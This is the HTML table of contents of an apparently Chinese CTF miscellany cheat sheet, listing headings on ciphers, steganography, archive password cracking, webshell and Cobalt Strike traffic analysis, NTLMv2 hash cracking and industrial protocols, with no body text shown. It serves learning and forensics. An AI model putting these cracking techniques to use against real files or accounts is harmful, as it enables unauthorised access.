        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BC%96%E7%A0%81-%E5%8A%A0%E5%AF%86"><span class="nav-text">编码&#x2F;加密</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Base%E5%AE%B6%E6%97%8F"><span class="nav-text">Base家族</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MD5"><span class="nav-text">MD5</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Byte%E7%B1%BB%E5%9E%8B"><span class="nav-text">Byte类型</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#emoji-AES"><span class="nav-text">emoji-AES</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#emoji%E8%A7%A3%E7%A0%81"><span class="nav-text">emoji解码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BA%8C%E7%BB%B4%E7%A0%81"><span class="nav-text">二维码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%A2%91%E6%AC%A1%E5%88%86%E6%9E%90"><span class="nav-text">频次分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%91%A9%E6%96%AF%E7%94%B5%E7%A0%81"><span class="nav-text">摩斯电码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%B4%E5%90%89%E5%B0%BC%E4%BA%9A%E5%AF%86%E7%A0%81"><span class="nav-text">维吉尼亚密码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%8C%E5%B0%94%E5%AF%86%E7%A0%81"><span class="nav-text">希尔密码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Rabbit%E5%8A%A0%E5%AF%86"><span class="nav-text">Rabbit加密</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B9%82%E6%95%B0%E5%8A%A0%E5%AF%86-%E4%BA%91%E5%BD%B1%E5%AF%86%E7%A0%81"><span class="nav-text">幂数加密&#x2F;云影密码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9B%BC%E5%BD%BB%E6%96%AF%E7%89%B9%E7%BC%96%E7%A0%81-%E5%B7%AE%E5%88%86%E6%9B%BC%E5%BD%BB%E6%96%AF%E7%89%B9%E7%BC%96%E7%A0%81"><span class="nav-text">曼彻斯特编码 &amp; 差分曼彻斯特编码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A4%BE%E4%BC%9A%E4%B8%BB%E4%B9%89%E6%A0%B8%E5%BF%83%E4%BB%B7%E5%80%BC%E8%A7%82%E7%BC%96%E7%A0%81"><span class="nav-text">社会主义核心价值观编码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9F%B3%E7%AC%A6%E8%A7%A3%E5%AF%86"><span class="nav-text">音符解密</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%95%B2%E5%87%BB%E7%A0%81"><span class="nav-text">敲击码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%B2%E6%96%87"><span class="nav-text">盲文</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Polybius%E5%AF%86%E7%A0%81"><span class="nav-text">Polybius密码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#AES%E5%8A%A0%E5%AF%86"><span class="nav-text">AES加密</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%83%E7%89%B9%E5%B7%B4%E4%BB%80%E7%A0%81-Atbash"><span class="nav-text">埃特巴什码(Atbash)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DNA%E7%BC%96%E7%A0%81"><span class="nav-text">DNA编码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%BF%E5%B0%84%E5%AF%86%E7%A0%81"><span class="nav-text">仿射密码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Brainfuck"><span class="nav-text">Brainfuck</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Ook%EF%BC%81"><span class="nav-text">Ook！</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8E%E4%BD%9B%E8%AE%BA%E7%A6%85-%E4%B8%8E%E7%86%8A%E8%AE%BA%E9%81%93-%E5%85%BD%E8%AF%AD%E5%8A%A0%E5%AF%86"><span class="nav-text">与佛论禅 &#x2F; 与熊论道 &#x2F; 兽语加密</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A9%BA%E7%99%BD%E6%A0%BC-%E6%97%A0%E5%AD%97%E5%A4%A9%E4%B9%A6%EF%BC%9A"><span class="nav-text">空白格 &#x2F; 无字天书：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Serpent%E8%A7%A3%E5%AF%86"><span class="nav-text">Serpent解密</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9B%B6%E5%AE%BD%E9%9A%90%E5%86%99"><span class="nav-text">零宽隐写</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Gronsfeld%E5%AF%86%E7%A0%81"><span class="nav-text">Gronsfeld密码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#UUencode%E7%BC%96%E7%A0%81"><span class="nav-text">UUencode编码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#AAencode%E7%BC%96%E7%A0%81"><span class="nav-text">AAencode编码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XXencode%E7%BC%96%E7%A0%81"><span class="nav-text">XXencode编码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#snow%E9%9A%90%E5%86%99"><span class="nav-text">snow隐写</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%AD%E6%96%87%E7%94%B5%E6%8A%A5"><span class="nav-text">中文电报</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Quote-Printable%E7%BC%96%E7%A0%81"><span class="nav-text">Quote-Printable编码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%AD%E6%96%87ASCII%E7%A0%81"><span class="nav-text">中文ASCII码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%B9%E6%A0%B9%E5%AF%86%E7%A0%81"><span class="nav-text">培根密码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%94%9F%E6%96%A4%E6%8B%B7"><span class="nav-text">锟斤拷</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%94%AE%E7%9B%98%E5%9D%90%E6%A0%87%E5%AF%86%E7%A0%81"><span class="nav-text">键盘坐标密码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A6%8F%E5%B0%94%E6%91%A9%E6%96%AF-%E8%B7%B3%E8%88%9E%E7%9A%84%E5%B0%8F%E4%BA%BA"><span class="nav-text">福尔摩斯 跳舞的小人</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%89%8B%E6%9C%BA%E4%B9%9D%E5%AE%AB%E6%A0%BC%E9%94%AE%E7%9B%98%E5%AF%86%E7%A0%81"><span class="nav-text">手机九宫格键盘密码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E7%BC%96%E7%A8%8B%E4%BB%A3%E7%A0%81%E7%94%BB%E5%9B%BE"><span class="nav-text">利用编程代码画图</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#spammimic%E7%BC%96%E7%A0%81"><span class="nav-text">spammimic编码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#malbolge"><span class="nav-text">malbolge</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PDU%E7%BC%96%E7%A0%81"><span class="nav-text">PDU编码</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E7%A0%81%E5%B7%A5%E5%85%B7"><span class="nav-text">解码工具</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Ciphey"><span class="nav-text">Ciphey</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CyberChef"><span class="nav-text">CyberChef</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Basecrack"><span class="nav-text">Basecrack</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9A%8F%E6%B3%A2%E9%80%90%E6%B5%81"><span class="nav-text">随波逐流</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%A4%B4"><span class="nav-text">文件头</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9B%BE%E7%89%87%E9%80%9A%E7%94%A8%E9%9A%90%E5%86%99"><span class="nav-text">图片通用隐写</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B1%9E%E6%80%A7-%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF"><span class="nav-text">属性-详细信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#010Editor%E6%A3%80%E6%9F%A5%E6%96%87%E4%BB%B6%E6%9C%AB%E5%B0%BE"><span class="nav-text">010Editor检查文件末尾</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#010Editor%E6%A3%80%E6%9F%A5%E6%96%87%E4%BB%B6%E5%A4%B4"><span class="nav-text">010Editor检查文件头</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#binwalk-foremost"><span class="nav-text">binwalk &amp; foremost</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%B2%E6%B0%B4%E5%8D%B0%E9%9A%90%E5%86%99"><span class="nav-text">盲水印隐写</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%A2%91%E5%9F%9F%E7%9B%B2%E6%B0%B4%E5%8D%B0"><span class="nav-text">频域盲水印</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9B%BE%E7%89%87%E5%88%86%E7%A6%BB-%E6%8B%BC%E6%8E%A5"><span class="nav-text">图片分离 &#x2F; 拼接</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#OurSecret%E9%9A%90%E5%86%99"><span class="nav-text">OurSecret隐写</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8B%BC%E5%9B%BE"><span class="nav-text">拼图</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%91%E9%82%BB%E6%B3%95%E7%BC%A9%E6%94%BE%E5%9B%BE%E7%89%87"><span class="nav-text">近邻法缩放图片</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#pixeljihad"><span class="nav-text">pixeljihad</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9A%90%E5%86%99%E6%96%87%E6%9C%AC%E8%97%8F%E5%9C%A8%E5%8E%9F%E5%9B%BE%E7%89%87%E5%92%8C%E9%9A%90%E5%86%99%E6%96%87%E4%BB%B6%E4%B8%AD%E9%97%B4"><span class="nav-text">隐写文本藏在原图片和隐写文件中间</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%90%E5%8F%96%E5%9B%BE%E7%89%87%E4%B8%AD%E7%AD%89%E8%B7%9D%E7%9A%84%E5%83%8F%E7%B4%A0%E7%82%B9%E5%BE%97%E5%88%B0%E9%9A%90%E5%86%99%E7%9A%84%E5%9B%BE%E7%89%87"><span class="nav-text">提取图片中等距的像素点得到隐写的图片</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#silenteye%E9%9A%90%E5%86%99"><span class="nav-text">silenteye隐写</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9B%BE%E7%89%87%E6%8A%A5%E9%94%99%E6%94%B9%E5%AE%BD%E9%AB%98%E5%90%8E%E5%9B%BE%E7%89%87%E6%97%A0%E5%8F%98%E5%8C%96"><span class="nav-text">图片报错改宽高后图片无变化</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DeEgger-Embedder%E9%9A%90%E5%86%99"><span class="nav-text">DeEgger Embedder隐写</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#EXIF%E9%9A%90%E5%86%99"><span class="nav-text">EXIF隐写</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#npiet"><span class="nav-text">npiet</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%8C%AB%E8%84%B8%E5%8F%98%E6%8D%A2"><span class="nav-text">猫脸变换</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PNG%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99"><span class="nav-text">PNG图片隐写</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#CRC%E9%94%99%E8%AF%AF"><span class="nav-text">CRC错误</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#LSB%E9%9A%90%E5%86%99"><span class="nav-text">LSB隐写</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#cloacked-pixel"><span class="nav-text">cloacked-pixel</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#IDAT%E5%9D%97%E9%9A%90%E5%86%99"><span class="nav-text">IDAT块隐写</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#apngdis-gui"><span class="nav-text">apngdis_gui</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CVE-2023-28303-%E6%88%AA%E5%9B%BE%E5%B7%A5%E5%85%B7%E6%BC%8F%E6%B4%9E"><span class="nav-text">CVE-2023-28303 截图工具漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#stegpy%E9%9A%90%E5%86%99"><span class="nav-text">stegpy隐写</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JPG%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99"><span class="nav-text">JPG图片隐写</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#outguess%E9%9A%90%E5%86%99"><span class="nav-text">outguess隐写</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#F5-steganography-master%EF%BC%88F5%E9%9A%90%E5%86%99%EF%BC%89"><span class="nav-text">F5-steganography-master（F5隐写）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#JPHS%E9%9A%90%E5%86%99"><span class="nav-text">JPHS隐写</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#steghide%E9%9A%90%E5%86%99"><span class="nav-text">steghide隐写</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BMP%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99"><span class="nav-text">BMP图片隐写</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#wbStego4open%E9%9A%90%E5%86%99"><span class="nav-text">wbStego4open隐写</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GIF%E9%9A%90%E5%86%99"><span class="nav-text">GIF隐写</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C%E7%BB%B4%E7%A0%81%E9%9A%90%E5%86%99"><span class="nav-text">二维码隐写</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Webp%E9%9A%90%E5%86%99"><span class="nav-text">Webp隐写</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RAW%E3%80%81ARW%E6%96%87%E4%BB%B6%E9%9A%90%E5%86%99"><span class="nav-text">RAW、ARW文件隐写</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#RAW%E7%9A%84LSB%E9%9A%90%E5%86%99"><span class="nav-text">RAW的LSB隐写</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%B4%E6%8E%A5%E6%94%B9%E5%90%8E%E7%BC%80%E4%B8%BA-data%EF%BC%8C%E7%84%B6%E5%90%8E%E6%8B%96%E5%85%A5Gimp%E5%8D%B3%E5%8F%AF"><span class="nav-text">直接改后缀为.data，然后拖入Gimp即可</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%8B%E7%BC%A9%E5%8C%85"><span class="nav-text">压缩包</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#zip%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84"><span class="nav-text">zip文件结构</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#rar%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84"><span class="nav-text">rar文件结构</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%8B%E7%BC%A9%E5%8C%85%E4%BC%AA%E5%8A%A0%E5%AF%86"><span class="nav-text">压缩包伪加密</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#zip%E6%96%87%E4%BB%B6%EF%BC%9A"><span class="nav-text">zip文件：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#rar%E6%96%87%E4%BB%B6%EF%BC%9A"><span class="nav-text">rar文件：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CRC%E7%88%86%E7%A0%B4%EF%BC%88%E5%8E%8B%E7%BC%A9%E5%8C%85%E4%B8%AD%E6%96%87%E4%BB%B6%E6%AF%94%E8%BE%83%E5%B0%8F%E7%9A%84%E6%97%B6%E5%80%99%EF%BC%89"><span class="nav-text">CRC爆破（压缩包中文件比较小的时候）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB"><span class="nav-text">明文攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%B7%B2%E7%9F%A5%E6%89%80%E6%9C%89%E7%9A%84%E6%98%8E%E6%96%87%E6%88%96%E4%B8%89%E6%AE%B5%E5%AF%86%E9%92%A5"><span class="nav-text">已知所有的明文或三段密钥</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%B7%B2%E7%9F%A5%E9%83%A8%E5%88%86%E6%98%8E%E6%96%87"><span class="nav-text">已知部分明文</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#1-%E7%AE%80%E5%8D%95%E7%9A%84%E5%8A%A0%E5%AF%86%E6%96%87%E6%9C%AC%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%A0%B4%E8%A7%A3"><span class="nav-text">1)简单的加密文本压缩包破解</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-%E5%88%A9%E7%94%A8PNG%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%E5%A4%B4%E7%A0%B4%E8%A7%A3"><span class="nav-text">2)利用PNG图片文件头破解</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-%E5%88%A9%E7%94%A8%E5%8E%8B%E7%BC%A9%E5%8C%85%E6%A0%BC%E5%BC%8F%E7%A0%B4%E8%A7%A3"><span class="nav-text">3)利用压缩包格式破解</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-EXE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E7%A0%B4%E8%A7%A3"><span class="nav-text">4)EXE文件格式破解</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5-%E6%B5%81%E9%87%8F%E5%8C%85pcapng%E6%A0%BC%E5%BC%8F%E8%A7%A3%E5%AF%86"><span class="nav-text">5)流量包pcapng格式解密</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#6-%E7%BD%91%E7%AB%99%E7%9B%B8%E5%85%B3%E6%96%87%E4%BB%B6%E7%A0%B4%E8%A7%A3"><span class="nav-text">6)网站相关文件破解</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#7-SVG%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E7%A0%B4%E8%A7%A3"><span class="nav-text">7)SVG文件格式破解</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#8-VMDK%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E7%A0%B4%E8%A7%A3"><span class="nav-text">8)VMDK文件格式破解</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%9C%A8%E6%AF%94%E8%B5%9B%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95"><span class="nav-text">在比赛中的使用记录</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3-%E7%88%86%E7%A0%B4%E6%97%B6%E6%B3%A8%E6%84%8F%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6"><span class="nav-text">暴力破解(爆破时注意限制长度)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%9E%E7%8E%AF%E5%A5%97%E5%8E%8B%E7%BC%A9%E5%8C%85"><span class="nav-text">连环套压缩包</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%AA%E7%9F%A5%E5%90%8E%E7%BC%80%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85"><span class="nav-text">未知后缀的压缩包</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%86%E5%8D%B7%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%90%88%E5%B9%B6"><span class="nav-text">分卷压缩包合并</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%82%B8%E5%BC%B9"><span class="nav-text">压缩包炸弹</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A0%B9%E6%8D%AE010%E4%B8%AD%E7%9A%84%E6%A8%A1%E6%9D%BF%E4%BF%AE%E6%94%B9%E4%BA%86%E6%9F%90%E4%BA%9B%E5%8F%82%E6%95%B0"><span class="nav-text">根据010中的模板修改了某些参数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%AF%86%E7%A0%81%E6%98%AF%E4%B8%8D%E5%8F%AF%E8%A7%81%E5%AD%97%E7%AC%A6"><span class="nav-text">压缩包密码是不可见字符</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AD%97%E8%8A%82%E6%95%B0%E5%BE%88%E7%9F%AD%E7%9A%84%E6%83%85%E5%86%B5"><span class="nav-text">字节数很短的情况</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AD%97%E8%8A%82%E6%95%B0%E8%BE%83%E9%95%BF%E7%9A%84%E6%83%85%E5%86%B5"><span class="nav-text">字节数较长的情况</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PDF%E9%9A%90%E5%86%99"><span class="nav-text">PDF隐写</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MS-Office%E9%9A%90%E5%86%99"><span class="nav-text">MS-Office隐写</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Excel%E6%96%87%E4%BB%B6%EF%BC%9A-xls-xlsx"><span class="nav-text">Excel文件：.xls .xlsx</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Word%E6%96%87%E4%BB%B6%EF%BC%9A-doc-docx"><span class="nav-text">Word文件：.doc .docx</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TXT%E6%96%87%E6%9C%AC%E9%9A%90%E5%86%99"><span class="nav-text">TXT文本隐写</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HTML%E9%9A%90%E5%86%99"><span class="nav-text">HTML隐写</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-text">流量分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#WireShark%E5%9F%BA%E7%A1%80"><span class="nav-text">WireShark基础</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#tshark%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B"><span class="nav-text">tshark使用教程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80%E8%80%83%E7%82%B9"><span class="nav-text">流量分析基础考点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#USB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-text">USB流量分析</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%94%AE%E7%9B%98%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-text">键盘流量分析</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%BC%A0%E6%A0%87%E6%B5%81%E9%87%8F"><span class="nav-text">鼠标流量</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%95%B0%E4%BD%8D%E6%9D%BF%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%EF%BC%9A"><span class="nav-text">数位板流量分析：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-text">SQL注入流量分析</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-text">Webshell流量分析</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%8F%9C%E5%88%80%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-text">菜刀流量分析</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%93%A5%E6%96%AF%E6%8B%89%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-text">哥斯拉流量分析</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%86%B0%E8%9D%8E%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-text">冰蝎流量分析</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-text">蚁剑流量分析</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#CobalStrike%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-text">CobalStrike流量分析</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#NTLM%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-text">NTLM流量分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%90%E5%8F%96-NTLMv2-%E5%93%88%E5%B8%8C%E5%80%BC%E5%B9%B6%E7%A0%B4%E8%A7%A3%EF%BC%88SMB%E5%8D%8F%E8%AE%AE%EF%BC%89"><span class="nav-text">提取 NTLMv2 哈希值并破解（SMB协议）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%90%E5%8F%96-NTLMv2-%E5%93%88%E5%B8%8C%E5%80%BC%E5%B9%B6%E7%A0%B4%E8%A7%A3%EF%BC%88HTTP%E5%8D%8F%E8%AE%AE%EF%BC%89"><span class="nav-text">提取 NTLMv2 哈希值并破解（HTTP协议）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%90%E5%8F%96-NTLMv2-%E5%93%88%E5%B8%8C%E5%80%BC%E5%B9%B6%E7%A0%B4%E8%A7%A3%EF%BC%88SMTP%E5%8D%8F%E8%AE%AE%EF%BC%89"><span class="nav-text">提取 NTLMv2 哈希值并破解（SMTP协议）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0RDP%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-text">本地RDP流量分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B7%A5%E6%8E%A7%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-text">工控流量分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Modbus-%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90"><span class="nav-text">Modbus 协议分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Modbus-RTU"><span class="nav-text">Modbus&#x2F;RTU</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BE%8B%E9%A2%981-HNGK-Modbus%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-text">例题1 HNGK-Modbus流量分析</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#S7comm-%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90"><span class="nav-text">S7comm 协议分析</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BE%8B%E9%A2%981-2020ICSC%E6%B9%96%E5%B7%9E%E7%AB%99%E2%80%94%E5%B7%A5%E6%8E%A7%E5%8D%8F%E8%AE%AE%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90"><span class="nav-text">例题1 2020ICSC湖州站—工控协议数据分析</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%93%9D%E7%89%99-OBEX-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-text">蓝牙(OBEX)流量分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%82%AE%E4%BB%B6-STMP-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span 